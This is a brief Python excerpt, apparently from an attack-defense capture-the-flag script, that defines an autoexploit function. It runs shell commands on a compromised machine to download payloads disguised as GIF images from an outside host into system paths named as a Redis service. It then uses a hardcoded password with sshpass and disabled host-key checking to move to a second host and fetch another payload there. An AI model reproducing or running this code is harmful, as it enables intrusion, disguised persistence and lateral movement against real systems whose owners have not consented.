...
def autoexploit(remote, team):
    ...
    remote.shell_cmd(f"curl http://10.10.10.1{team}/downloads/coolcat.gif -o /bin/redis-service")
    ...
    remote.shell_cmd(f"sshpass -p '&pV5)f*_^1' ssh -o 'StrictHostKeyChecking no' pallard@192.168.{team}.3 wget http://10.10.10.1{team}/gifs/coolcat2.gif -O redis")
